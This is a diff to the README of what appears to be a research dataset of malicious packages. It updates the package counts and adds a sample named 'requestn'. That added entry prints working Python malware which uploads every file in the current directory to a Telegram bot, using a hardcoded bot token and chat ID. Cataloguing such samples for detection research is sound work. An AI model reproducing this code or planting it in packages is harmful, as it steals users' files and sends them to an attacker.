@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,136 versions of the source code of 6,057 malicious packages.
+This data set includes about 7,137 versions of the source code of 6,058 malicious packages.
 
 ## Dataset Format
 
@@ -814,6 +814,52 @@ class algorithmb():
 		except:
 			return False
 ```
+
+### 21 Jul. 2024
+requestn [8.0] <br>
+```python
+import os
+import requests
+
+def promain():
+    try:
+        import socket
+        import webbrowser
+        import sys
+        import json
+        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'
+        ID2='5487978588'
+    except:
+        os.system("pip install webbrowser")
+        os.system("pip install socket")
+        os.system("clear")
+
+    S = '\033[1;33m'
+    A = "\033[1;91m" #red
+    C = "\033[1;97m" #white
+    ra = 0
+
+    file_ha = []
+
+    for file in os.listdir():
+        if os.path.isfile(file):
+            file_ha.append(file)
+            g = file
+            print(file)
+            massage = '@is_brother'
+            start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/is_brother")
+            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})
+  
+    print(file_ha)
+    massage = '@is_brother'
+
+    for file in file_ha:
+        with open("SIN.txt","a") as pro:
+            pro.write(str(file) + "\n")
+            print(file_ha)
+promain()
+```
+
 
 ## About the malicious packages detection
 
